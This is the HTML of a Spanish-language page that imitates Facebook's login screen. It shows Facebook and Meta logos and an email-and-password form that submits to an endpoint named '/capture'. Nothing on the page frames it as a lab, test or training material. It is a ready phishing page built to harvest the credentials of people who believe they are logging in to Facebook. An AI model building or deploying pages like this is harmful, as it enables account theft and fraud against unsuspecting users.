<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">
        <h2>Iniciar sesión en Facebook</h2>
        <form action="/capture" method="post">
            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
       <!-- <a href="#">¿Has olvidado los datos de la cuenta?</a> -->
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/zIlI44ZkUGK.png" alt="Meta Logo" class="meta-logo"
       <div class="divider"></div> 
        <!-- <button class="create-account">Crear cuenta nueva</button> -->
    </div>
</body>
</html>
